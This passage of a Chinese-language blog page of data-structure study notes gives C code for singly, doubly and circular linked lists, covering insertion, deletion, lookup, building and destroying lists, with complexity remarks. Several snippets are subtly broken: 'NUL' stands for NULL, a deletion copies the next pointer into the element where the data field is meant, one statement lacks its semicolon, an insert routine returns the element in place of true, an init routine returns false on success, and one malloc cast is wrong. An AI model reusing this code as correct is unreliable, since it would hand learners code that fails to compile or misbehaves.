class="keyword">if</span>(i==<span class="number">1</span>)&#123;</span><br><span class="line">LNode *s=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">s-&gt;data=e;</span><br><span class="line">s-&gt;next=L;</span><br><span class="line">L=s;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">LNode *p;</span><br><span class="line"><span class="type">int</span> j=<span class="number">1</span>;</span><br><span class="line">p=L;</span><br><span class="line"><span class="keyword">while</span>(p!=NUL&amp;&amp;j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">LNode *s=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">s-&gt;data=e;</span><br><span class="line">s-&gt;next=p-&gt;next;</span><br><span class="line">p-&gt;next=s;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指定结点的后插操作"><a href="#指定结点的后插操作" class="headerlink" title="指定结点的后插操作"></a>指定结点的后插操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">InsertNextNode</span><span class="params">(LNode *p,ElemType e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">LNode *s=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line"><span class="keyword">if</span>(s==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">s-&gt;data=e;</span><br><span class="line">s-&gt;next=p-&gt;next;</span><br><span class="line">p-&gt;next=s;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//按位序插入封装</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">LNode *p;</span><br><span class="line"><span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">p=L;</span><br><span class="line"><span class="keyword">while</span>(p!=NUL&amp;&amp;j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> InsertNextNode(p,e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指定结点的前插操作"><a href="#指定结点的前插操作" class="headerlink" title="指定结点的前插操作"></a>指定结点的前插操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//赋值替换，不用去找前驱结点</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InsertPriorNode</span><span class="params">(LNode *p,ElemType e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">LNode *s=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line"><span class="keyword">if</span>(s==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">s-&gt;next=p-&gt;next;</span><br><span class="line">p-&gt;next=s;</span><br><span class="line">s-&gt;data=p-&gt;data;</span><br><span class="line">p-&gt;data=e;</span><br><span class="line"><span class="keyword">return</span> e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/1602914170771.png" alt=""><br>O(1)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">InsertPriorNode</span><span class="params">(LNode *p,LNode *s)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>||s==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125;</span><br><span class="line">s-&gt;next=p-&gt;next;</span><br><span class="line">p-&gt;next=s;</span><br><span class="line">ElemType temp=p-&gt;data;</span><br><span class="line">p-&gt;data=s-&gt;data;</span><br><span class="line">s-&gt;data=temp;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://raw.githubusercontent.com/iloveflag/images/master/4928414189197.png" alt=""></p><h3 id="按位序删除（带头结点）"><a href="#按位序删除（带头结点）" class="headerlink" title="按位序删除（带头结点）"></a>按位序删除（带头结点）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">ListDelete</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType &amp;e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">LNode *p;</span><br><span class="line"><span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">p=L;</span><br><span class="line"><span class="keyword">while</span>(p!=<span class="literal">NULL</span>&amp;&amp;j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123; <span class="comment">//i值不合法 </span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;next==<span class="literal">NULL</span>)&#123; <span class="comment">//第i-1个结点之后已无其他结点 </span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">LNode *q=p-&gt;next;</span><br><span class="line">e=q-&gt;next;</span><br><span class="line">p-&gt;next=q-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(q);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>avg worse O(n)<br>best O(1)</p><h3 id="指定结点的删除"><a href="#指定结点的删除" class="headerlink" title="指定结点的删除"></a>指定结点的删除</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeleteNode</span><span class="params">(LNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">LNode *q=p-&gt;next;</span><br><span class="line">p-&gt;data=p-&gt;next-&gt;data;</span><br><span class="line">p-&gt;next=q-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(q);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/3772526177064.png" alt=""><br>O(1)<br><strong>如果p是最后一个结点，只能从表头开始依次寻找p的前驱，时间复杂度O(n)</strong></p><h2 id="2-7-单链表的查找"><a href="#2-7-单链表的查找" class="headerlink" title="2.7 单链表的查找"></a>2.7 单链表的查找</h2><h3 id="按位查找"><a href="#按位查找" class="headerlink" title="按位查找"></a>按位查找</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LNode * <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">LNode *p;</span><br><span class="line"><span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">p=L;</span><br><span class="line"><span class="keyword">while</span>(p!=<span class="literal">NULL</span>&amp;&amp;j&lt;i)&#123;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">j++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>avg O(n)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//王道书版本</span></span><br><span class="line">LNode * <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line"><span class="type">int</span> j=<span class="number">1</span>;</span><br><span class="line">LNode *p=L-&gt;next;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(p!=<span class="literal">NULL</span>&amp;&amp;j&lt;i)&#123;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">j++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="按值查找-1"><a href="#按值查找-1" class="headerlink" title="按值查找"></a>按值查找</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LNode * <span class="title function_">LocateElem</span><span class="params">(LinkList L,ElemType e)</span>&#123;</span><br><span class="line">LNode *p=L-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(p!=<span class="literal">NULL</span>&amp;&amp;p-&gt;data!=e)&#123;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>avg O(n)</p><h3 id="求表的长度"><a href="#求表的长度" class="headerlink" title="求表的长度"></a>求表的长度</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">length</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line"><span class="type">int</span> len=<span class="number">0</span>;</span><br><span class="line">LNode *p=L;</span><br><span class="line"><span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">len++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-8-单链表的建立"><a href="#2-8-单链表的建立" class="headerlink" title="2.8 单链表的建立"></a>2.8 单链表的建立</h4><h3 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line">L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">LNode *s,*r=L; <span class="comment">//r为表尾指针</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line"><span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;</span><br><span class="line">s=(LNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">s-&gt;data=x;</span><br><span class="line">r-&gt;next=s;</span><br><span class="line">r=s;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">&#125;</span><br><span class="line">r-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>O(n)</p><h3 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">LNode *s;</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line">L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//很重要</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line"><span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;</span><br><span class="line">s=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">s-&gt;data=x;</span><br><span class="line">s-&gt;next=L-&gt;next;</span><br><span class="line">L-&gt;next=s;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>重要应用：链表的逆置</strong></p><h2 id="2-9-双链表"><a href="#2-9-双链表" class="headerlink" title="2.9 双链表"></a>2.9 双链表</h2><h3 id="定义与初始化"><a href="#定义与初始化" class="headerlink" title="定义与初始化"></a>定义与初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;DNode,*DLinklist;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitDLinkList</span><span class="params">(DLinklist &amp;L)</span>&#123;</span><br><span class="line">L=(DNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line"><span class="keyword">if</span>(L==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">L-&gt;prior=<span class="literal">NULL</span>; <span class="comment">//NULL forever</span></span><br><span class="line">L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">testDLinkList</span><span class="params">()</span>&#123;</span><br><span class="line">DLinklist L;</span><br><span class="line">InitDLinkList(L);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">Empty</span><span class="params">(DLinklist L)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(L-&gt;next==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="双链表的插入"><a href="#双链表的插入" class="headerlink" title="双链表的插入"></a>双链表的插入</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">InsertNextDNode</span><span class="params">(DNode *p,DNode *s)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>||s==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">s-&gt;next=p-&gt;next; <span class="comment">//step 1</span></span><br><span class="line"><span class="keyword">if</span>(p-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">p-&gt;next-&gt;prior=s; <span class="comment">//step2</span></span><br><span class="line">&#125;</span><br><span class="line">s-&gt;prior=p; <span class="comment">//step3</span></span><br><span class="line">p-&gt;next=s; <span class="comment">//step4</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/2026815170772.png" alt=""><br>p没有后继结点：<br><img src="https://raw.githubusercontent.com/iloveflag/images/master/1659320177065.png" alt=""></p><h3 id="双链表的删除"><a href="#双链表的删除" class="headerlink" title="双链表的删除"></a>双链表的删除</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">DeleteNextDNode</span><span class="params">(DNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">DNode *q=p-&gt;next;</span><br><span class="line"><span class="keyword">if</span>(q==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">p-&gt;next=q-&gt;next;</span><br><span class="line"><span class="keyword">if</span>(q-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">q-&gt;next-&gt;prior=p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(q);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/iloveflag/images/master/1246926197231.png" alt=""></p><h3 id="双链表的销毁"><a href="#双链表的销毁" class="headerlink" title="双链表的销毁"></a>双链表的销毁</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DestoryList</span><span class="params">(DLinklist &amp;L)</span>&#123;</span><br><span class="line"><span class="keyword">while</span>(L-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">DeleteNextDNode(L);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(L);</span><br><span class="line">L=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="双链表的遍历"><a href="#双链表的遍历" class="headerlink" title="双链表的遍历"></a>双链表的遍历</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">p=p-&gt;prior;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(p-&gt;prior!=<span class="literal">NULL</span>)&#123; <span class="comment">//跳过头结点</span></span><br><span class="line">p=p-&gt;prior;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>双链表不可随机存取，按位查找，按值查找操作都只能用遍历的方式实现O(n)</strong></p><h2 id="2-10-循环列表"><a href="#2-10-循环列表" class="headerlink" title="2.10 循环列表"></a>2.10 循环列表</h2><h3 id="循环单链表"><a href="#循环单链表" class="headerlink" title="循环单链表"></a>循环单链表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">L=(LNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line"><span class="keyword">if</span>(L==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">L-&gt;next=L;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Empty</span><span class="params">(LinkList L )</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(L-&gt;next==L)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isTail</span><span class="params">(LinkList L,LNode *p)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;next==L)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="循环双链表"><a href="#循环双链表" class="headerlink" title="循环双链表"></a>循环双链表</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;DNode,*DLinklist;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitDLinkList</span><span class="params">(DLinklist &amp;L)</span>&#123;</span><br><span class="line">L=(DNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line"><span class="keyword">if</span>(L==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">L-&gt;prior=L;</span><br><span class="line">L-&gt;next=L;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">testDlinkList</span><span class="params">()</span>&#123;</span><br><span class="line">DLinklist L;</span><br><span class="line">InitDLinkList(L);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Empty</span><span class="params">(DLinklist L)</span>&#123;</span><br><span class="line"><span 